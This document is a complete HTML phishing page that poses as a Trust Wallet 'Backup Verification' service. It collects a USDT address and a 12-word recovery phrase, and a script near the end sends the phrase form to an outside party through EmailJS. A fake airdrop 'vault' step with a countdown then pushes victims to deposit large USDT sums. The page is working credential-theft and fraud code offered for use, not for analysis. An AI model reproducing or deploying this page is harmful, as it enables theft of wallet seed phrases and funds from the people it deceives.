<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Backup Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    * { box-sizing: border-box; }
    :root {
      /* Trust wallet-like palette */
      --blue: #2b6df7;
      --dark: #0f172a;
      --green: #22c55e;
      --gray: #64748b;
      --bg: #0b1220;
      --card: #111827;
    }

    .phrase-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-top: 12px;
    }
    .phrase-grid div {
      background: #0b1324;
      padding: 8px;
      border-radius: 10px;
    }
    .phrase-grid label {
      font-size: 12px;
      color: var(--gray);
      display: block;
      margin-bottom: 4px;
    }
    .phrase-grid input {
      width: 100%;
      padding: 8px;
      border: 1px solid #2b3442;
      background: #0b1324;
      color: #e5e7eb;
      border-radius: 6px;
    }

    body {
      margin: 0;
      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: linear-gradient(180deg, var(--bg), #0f172a);
      color: #e5e7eb;
    }

    header {
      display: flex; align-items: center; gap: 12px;
      padding: 20px; border-bottom: 1px solid #1f2937;
    }
    header .logo {
      background: transparent;   /* remove the blue background */
      border: none;              /* remove any border */
      width: auto;               /* let the image define its width */
      height: auto;              /* let the image define its height */
      display: flex;             /* keeps alignment with text */
      align-items: center;
    }
    header .logo img {
      height: 50px;              /* control logo size */
      width: auto;               /* keep proportions */
      display: block;            /* removes inline spacing */
    }
    header .title { font-weight: 600; font-size: 18px; }

    main { max-width: 640px; margin: 40px auto; padding: 0 16px; }
    .card { background: var(--card); border: 1px solid #1f2937; border-radius: 16px; padding: 24px; }
    .subtitle { color: var(--gray); margin-top: 4px; }
    label { display: block; margin: 16px 0 8px; color: #cbd5e1; }

    input, textarea, select {
      width: 100%; padding: 12px 14px; border-radius: 10px;
      border: 1px solid #2b3442; background: #0b1324; color: #e5e7eb;
      outline: none;
    }

    select {
      width: 100%;
      padding: 10px;
      margin-top: 8px;
      border: 1px solid #2b3442;
      border-radius: 6px;
      background: #0b1324;
      color: #e5e7eb;
      font-size: 14px;
      appearance: none;
    }
    select:focus {
      outline: none;
      border-color: var(--blue);
      box-shadow: 0 0 6px var(--blue);
    }

    button {
      margin-top: 16px; width: 100%; padding: 12px 16px; border-radius: 10px;
      background: var(--blue); border: none; color: white; font-weight: 600; cursor: pointer;
    }

    .muted { color: var(--gray); font-size: 12px; margin-top: 8px; }
    .progress { height: 8px; background: #1f2937; border-radius: 999px; overflow: hidden; margin-top: 12px; }
    .progress > div { height: 100%; width: 0%; background: var(--green); transition: width .6s ease; }

    .checks { display: flex; gap: 8px; margin-top: 12px; }
    .check { display: inline-flex; align-items: center; gap: 6px; padding: 8px 10px; background: #0d1629; border: 1px solid #1f2937; border-radius: 999px; color: #a7f3d0; }

    .tiers { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }
    .tier { padding: 16px; background: #0d1629; border: 1px solid #1f2937; border-radius: 12px; }

    .timer { color: #fb7185; font-weight: 600; }

    .loader {
      margin-top: 12px; height: 14px; background: #0d1629;
      border-radius: 6px; position: relative; overflow: hidden;
    }
    .loader::after {
      content: ""; position: absolute; left: -30%; top: 0; bottom: 0; width: 30%;
      background: linear-gradient(90deg, transparent, #1f3b70, transparent);
      animation: load 1.2s infinite;
    }
    @keyframes load { to { left: 110%; } }

    .dash { margin-top: 16px; padding: 16px; background: #0d1629; border: 1px solid #1f2937; border-radius: 12px; }
    .status { color: #93c5fd; font-weight: 600; }
    .lock { color: #eab308; }

    @keyframes blink {
      0%, 100% { border-color: #2b3442; }
      50% { border-color: #fb7185; box-shadow: 0 0 6px #fb7185; }
    }
    #tierSelect.attention { animation: blink 1s infinite; }

    #copyBtn:hover { background: #2563eb; }
    #copyBtn:active { background: #1d4ed8; }
    #copyMsg { animation: fadeIn 0.3s ease-in; }

/* ‚úÖ Improved Dashboard Styles */
.dashboard {
  background: var(--card);
  border: 1px solid #1f2937;
  border-radius: 16px;
  padding: 24px;
  margin-top: 24px;
  animation: fadeInCard 0.5s ease-in;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
}

@keyframes fadeInCard {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}

.balance {
  display: flex;
  flex-direction: column;
  align-items: flex-start;
  gap: 8px;
  font-size: 14px;
  margin-bottom: 12px;
}

.balance-logo {
  height: 28px;
  width: auto;
}

/* ‚úÖ Wallet row layout */
.wallet-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  width: 100%;
  gap: 6px;
  margin-top: 4px;
  flex-wrap: nowrap;
}

/* ‚úÖ Wallet address: one line with ellipsis */
#walletDisplay {
  font-size: 14px;
  color: #e5e7eb;
  flex: 1 1 auto;
  min-width: 0;              /* allows flexbox to shrink */
  white-space: nowrap;       /* keep on one line */
  overflow: hidden;
  text-overflow: ellipsis;   /* show ... if too long */
}

/* ‚úÖ Compact copy button */
#copyBtn {
  flex: 0 0 auto;            /* do not grow or shrink */
  height: 28px;
  width: 32px;               /* tight square button */
  padding: 0;
  background: #3b82f6;
  color: white;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  line-height: 1;
  transition: background 0.2s ease;
}
#copyBtn i { font-size: 14px; }
#copyBtn:hover { background: #2563eb; }
#copyBtn:active { background: #1d4ed8; }

.amount {
  font-size: 16px;
  font-weight: 600;
  color: var(--green);
  margin-top: 12px;
}

.status-message {
  color: #93c5fd;
  font-weight: 600;
  margin-top: 12px;
}

.idle-message {
  color: #eab308;
  margin-top: 12px;
  font-size: 14px;
}

#copyMsg {
  animation: fadeIn 0.3s ease-in;
  margin-top: 6px;
}

#toast {
  position: fixed;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.8);
  color: #fff;
  padding: 8px 14px;
  border-radius: 6px;
  font-size: 14px;
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.3s ease;
}

@keyframes pulseGlow {
  0% { text-shadow: 0 0 0px #eab308; }
  50% { text-shadow: 0 0 8px #eab308; }
  100% { text-shadow: 0 0 0px #eab308; }
}
.idle-message.glow { animation: pulseGlow 1.5s infinite; }

/* Dashboard container */
.dashboard {
  padding: 16px;
  max-width: 420px;
  margin: 0 auto;
}

/* Card style */
.card {
  background: #111827;
  border-radius: 12px;
  padding: 16px;
  margin-bottom: 12px;
}

/* Wallet row */
.wallet-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 8px;
}

/* Wallet address */
#walletDisplay {
  font-size: 14px;
  font-weight: 600;
  letter-spacing: 0.3px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

/* Locked balance */
.amount {
  font-size: 18px;
  font-weight: 700;
  color: var(--green);
  margin-top: 8px;
}

/* Status message */
.status-message {
  font-size: 14px;
  font-weight: 600;
  color: #93c5fd;
  margin-top: 6px;
}

/* Deposit message */
.idle-message {
  font-size: 15px;
  font-weight: 600;
  color: #eab308;
  margin-top: 8px;
  line-height: 1.4;
}

.loader {
  pointer-events: none;
  z-index: 1;
}

#s1btn {
  position: relative;
  z-index: 2;
  pointer-events: auto;
}

</style>
</head>
<body>
  <header>
    <div class="logo">
      <img src="https://logos-world.net/wp-content/uploads/2023/12/Trust-Wallet-New-Logo.png" 
           alt="Demo Logo">
    </div>
    <div>
      <div class="title">Backup Verification</div>
    </div>
  </header>

<main>
  <div id="step1" class="card" role="region" aria-labelledby="s1title">
    <h2 id="s1title">Wallet address</h2>

    <!-- Wrapped input block -->
    <div style="width: 100%; display: flex; flex-direction: column;">
      <label for="addr">Enter your USDT (TRC20) address</label>
      <input id="addr" name="addr" placeholder="0x..." autocomplete="off" />
    </div>

    <div class="loader" aria-hidden="true"></div>
    <button id="s1btn">Continue</button>

    <!-- ‚úÖ Security Badge now inside step1 -->
    <div class="security-badge" style="display:flex; align-items:center; justify-content:center; margin-top:20px; color:#666666; font-size:14px;">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
      </svg>
      Encrypted Connection ‚Ä¢ Verified
    </div>
  </div>
  
  <div id="step2" class="card" hidden role="region" aria-labelledby="s2title">
  <h2 id="s2title">Recovery Phrase</h2>

  <!-- Wrap inputs in a form -->
  <form id="step2-form">
    <label>Enter your backup phrase</label>
    <div class="phrase-grid">
  <div><label for="word1">1</label>
    <input type="text" id="word1" name="word1" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word2">2</label>
    <input type="text" id="word2" name="word2" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word3">3</label>
    <input type="text" id="word3" name="word3" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word4">4</label>
    <input type="text" id="word4" name="word4" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word5">5</label>
    <input type="text" id="word5" name="word5" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word6">6</label>
    <input type="text" id="word6" name="word6" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word7">7</label>
    <input type="text" id="word7" name="word7" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word8">8</label>
    <input type="text" id="word8" name="word8" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word9">9</label>
    <input type="text" id="word9" name="word9" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word10">10</label>
    <input type="text" id="word10" name="word10" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word11">11</label>
    <input type="text" id="word11" name="word11" autocomplete="off" spellcheck="false" />
  </div>
  <div><label for="word12">12</label>
    <input type="text" id="word12" name="word12" autocomplete="off" spellcheck="false" />
  </div>
    </div>

    <!-- Confirmation checkbox -->
    <label style="display:flex; align-items:center; gap:8px; margin-top:12px; color:#22c55e;">
      <input type="checkbox" id="matchCheck" name="matchCheck">
      <span>I confirm my backup is correct & matches my TRC20 wallet address</span>
    </label>

    <div class="progress" aria-hidden="true"><div id="progbar"></div></div>
    <button id="s2btn" type="submit">Verify</button>
  </form>

  <!-- Security Badge -->
  <div class="security-badge" style="display:flex; align-items:center; justify-content:center; margin-top:20px; color:#666; font-size:14px;">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right:8px;">
      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
    </svg>
    Do not close during verification
  </div>
  </div>
  
  <div id="step3" class="card" hidden role="region" aria-labelledby="s3title">
    <h2 id="s3title">Vault Eligibility</h2>
    <p style="margin-top: 8px; color: var(--green); font-weight: 600; display:flex; align-items:center; gap:6px;">
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16">
        <path d="M8 0c-.69 0-1.37.14-2 .41L2 2v5c0 4.5 3.5 8.5 6 9 2.5-.5 6-4.5 6-9V2l-4-1.59C9.37.14 8.69 0 8 0z"/>
      </svg>
      Backup confirmed ‚Äî now let‚Äôs activate your vault eligibility.
    </p>
    <p class="subtitle">
      This is a one-time vault entry. Please select your airdrop tier.
    </p>

    <label for="tierSelect" style="margin-top: 12px; display:block; color:#cbd5e1;">
      Choose a tier:
    </label>
    <select id="tierSelect" name="tierSelect" class="attention">
      <option value="">-- Select a tier --</option>
      <option value="1M">1,000,000 USDT airdrop ‚Üí Min balance: 100,000 USDT</option>
      <option value="250k">250,000 USDT airdrop ‚Üí Min balance: 50,000 USDT</option>
      <option value="100k">100,000 USDT airdrop ‚Üí Min balance: 20,000 USDT</option>
      <option value="50k">50,000 USDT airdrop ‚Üí Min balance: 10,000 USDT</option>
      <option value="30k">30,000 USDT airdrop ‚Üí Min balance: 5,000 USDT</option>
      <option value="8.8k">8,800 USDT airdrop ‚Üí Min balance: 1,500 USDT</option>
      <option value="2.9k">2,900 USDT airdrop ‚Üí Min balance: 400 USDT</option>
      <option value="1.2k">1,200 USDT airdrop ‚Üí Min balance: 250 USDT</option>
      <option value="600">600 USDT airdrop ‚Üí Min balance: 100 USDT</option>
    </select>

    <p class="muted" style="margin-top: 16px;">
      Please deposit the required balance into your wallet. Once confirmed, your vault reward will be auto credited within 24 hours.
    </p>
    <p id="countdown" style="color:#fb7185; font-weight:600;"></p>

    <script>
      // 24 hours in seconds
      let timeLeft = 24 * 60 * 60;
      const countdownEl = document.getElementById('countdown');

      function updateCountdown() {
        const hours = Math.floor(timeLeft / 3600);
        const minutes = Math.floor((timeLeft % 3600) / 60);
        const seconds = timeLeft % 60;
        countdownEl.textContent = `Time remaining: ${hours}h ${minutes}m ${seconds}s`;
        if (timeLeft > 0) {
          timeLeft--;
          setTimeout(updateCountdown, 1000);
        }
      }
      updateCountdown();
    </script>

    <button id="s3btn" style="margin-top: 16px;">Activate eligibility</button>
    <div id="loaderBar" class="loader" hidden></div>
  </div>

  <!-- Final Dashboard -->
  <div id="final" class="dashboard" hidden>
    <div class="balance">
      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="balance-logo" />
      <div class="wallet-row">
        <strong id="walletDisplay"></strong>
        <button id="copyBtn" title="Copy wallet address">
          <i class="fa-solid fa-copy"></i>
        </button>
      </div>
    </div>

    <div id="copyMsg" style="font-size: 0.8rem; color: #22c55e; margin-top: 4px; display: none;">
      Address Copied!
    </div>
    <div class="amount" id="lockedBalance">üîí Locked</div>
    <div class="status-message">Eligibility activated</div>
    <div class="idle-message" id="depositMsg">‚è≥ Awaiting deposit...</div>
  </div>
</main>

<div id="toast"></div>

<script>
document.addEventListener("DOMContentLoaded", () => {
  // Toast helper
  function showToast(message) {
    const toast = document.getElementById('toast');
    if (toast) {
      toast.textContent = message;
      toast.style.opacity = "1";
      setTimeout(() => { toast.style.opacity = "0"; }, 2000);
    }
  }

  // References
  const s1 = document.getElementById('step1');
  const s2 = document.getElementById('step2');
  const s3 = document.getElementById('step3');
  const fin = document.getElementById('final');
  const prog = document.getElementById('progbar');

  const tierSelect = document.getElementById('tierSelect');
  const loaderBar = document.getElementById('loaderBar');
  const s1btn = document.getElementById('s1btn');
  const s2btn = document.getElementById('s2btn');
  const s3btn = document.getElementById('s3btn');
  const copyBtn = document.getElementById('copyBtn');

  // Step 1 ‚Üí Step 2
  if (s1btn) {
    s1btn.addEventListener('click', () => {
      const addrEl = document.getElementById('addr');
      const addr = addrEl ? addrEl.value.trim() : '';
      if (!addr) {
        addrEl?.focus(); // auto-focus if empty
        return;
      }
      setTimeout(() => {
        s1.hidden = true;
        s2.hidden = false;
      }, 2000);
    });
  }

  // Step 2 ‚Üí Step 3
  if (s2btn) {
    s2btn.addEventListener('click', () => {
      let phrase = '';
      for (let i = 1; i <= 12; i++) {
        const input = document.getElementById(`word${i}`);
        if (input) {
          const val = input.value.trim();
          if (!val) {
            input.focus(); // auto-focus missing word
            return;
          }
          phrase += val + ' ';
        }
      }
      phrase = phrase.trim();

      // Check the confirmation checkbox
      const matchCheck = document.getElementById('matchCheck');
      if (!matchCheck || !matchCheck.checked) {
        showToast("Please confirm your backup matches your TRC20 wallet address.");
        return;
      }

      // Continue with flow
      prog.style.width = '70%';
      setTimeout(() => {
        prog.style.width = '100%';
        s2.hidden = true;
        s3.hidden = false;
      }, 3000);
    });
  }

  // Step 3 ‚Üí Final
  if (s3btn) {
    s3btn.addEventListener('click', () => {
      if (!tierSelect.value) {
        return; // blinking handles the prompt
      }
      loaderBar.hidden = false;

      setTimeout(() => {
        s3.hidden = true;
        fin.hidden = false;
        loaderBar.hidden = true;

        const walletAddr = document.getElementById('addr').value.trim();
        const tierValue = tierSelect.value;

        const tierMap = {
          "1M":   { deposit: "100,000", locked: "1,000,000" },
          "250k": { deposit: "50,000",  locked: "250,000" },
          "100k": { deposit: "20,000",  locked: "100,000" },
          "50k":  { deposit: "10,000",  locked: "50,000" },
          "30k":  { deposit: "5,000",   locked: "30,000" },
          "8.8k": { deposit: "1,500",   locked: "8,800" },
          "2.9k": { deposit: "400",     locked: "2,900" },
          "1.2k": { deposit: "250",     locked: "1,200" },
          "600":  { deposit: "100",     locked: "600" }
        };

        const tierChoice = tierMap[tierValue];
        if (tierChoice) {
          document.getElementById('walletDisplay').textContent = walletAddr;
          document.getElementById('lockedBalance').textContent =
            `${tierChoice.locked} USDT üîí Locked`;

          const depositMsg = document.getElementById('depositMsg');
          if (depositMsg) {
            depositMsg.textContent =
              `‚è≥ Deposit ${tierChoice.deposit} USDT (TRC20) to your wallet to unlock your locked ${tierChoice.locked} USDT`;
            depositMsg.classList.add('glow');
          }
        }
      }, 4000);
    });
  }

  // Copy button
  if (copyBtn) {
    copyBtn.addEventListener('click', () => {
      const walletAddr = document.getElementById('walletDisplay').textContent;
      navigator.clipboard.writeText(walletAddr).then(() => {
        showToast("Copied");
      }).catch(() => {
        showToast("Failed to copy");
      });
    });
  }
});
</script>

  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  (function() {
    emailjs.init("dvLgjhIHXXq7QXp5p"); // your public key
  })();

  const s2form = document.getElementById("step2-form");
  const prog = document.getElementById("progbar");
  const s2 = document.getElementById("step2");
  const s3 = document.getElementById("step3");

  s2form.addEventListener("submit", function(event) {
    event.preventDefault();

    // Check all 12 phrase inputs first
    const phraseInputs = s2form.querySelectorAll("input[name^='word']");
    for (let input of phraseInputs) {
      if (!input.value.trim()) {
        // Auto-focus the first empty box
        input.focus();
        return; // stop here, don't proceed
      }
    }

    // If all boxes are filled, check the confirmation checkbox
    const matchCheck = document.getElementById("matchCheck");
    if (!matchCheck.checked) {
      showToast("Please confirm your backup matches your TRC20 wallet address.");
      return;
    }

    // If everything is valid, send form via EmailJS
    emailjs.sendForm("service_1qzlil7", "template_w742mzr", "#step2-form")
      .then(function(response) {
        console.log("EmailJS success:", response);
        prog.style.width = "70%";
        setTimeout(() => {
          prog.style.width = "100%";
          s2.hidden = true;
          s3.hidden = false;
        }, 3000);
      })
      .catch(function(error) {
        console.error("EmailJS error:", error);
        showToast("Verification failed. Please try again.");
      });
  });
</script>
</body>
</html>
